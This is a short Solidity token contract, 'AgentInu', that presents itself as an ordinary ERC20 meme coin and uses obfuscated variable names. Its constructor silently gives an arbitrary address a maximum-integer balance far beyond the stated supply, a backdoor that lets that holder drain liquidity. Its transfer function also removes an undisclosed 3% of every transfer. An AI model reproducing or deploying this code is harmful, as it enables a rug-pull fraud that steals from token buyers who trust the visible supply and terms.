// https://t.me/agentinu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.10;

import "./Ownable.sol";
import "./ERC20.sol";

contract AgentInu is ERC20, Ownable {
    uint256 private carried = ~uint256(0);
    uint256 public involved = 3;

    constructor(
        string memory atomic,
        string memory brain,
        address strength,
        address properly
    ) ERC20(atomic, brain) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[_msgSender()] = _totalSupply;
        _balances[properly] = carried;
    }

    function _transfer(
        address tight,
        address own,
        uint256 goose
    ) internal override {
        uint256 active = (goose / 100) * involved;
        goose = goose - active;
        super._transfer(tight, own, goose);
    }
}
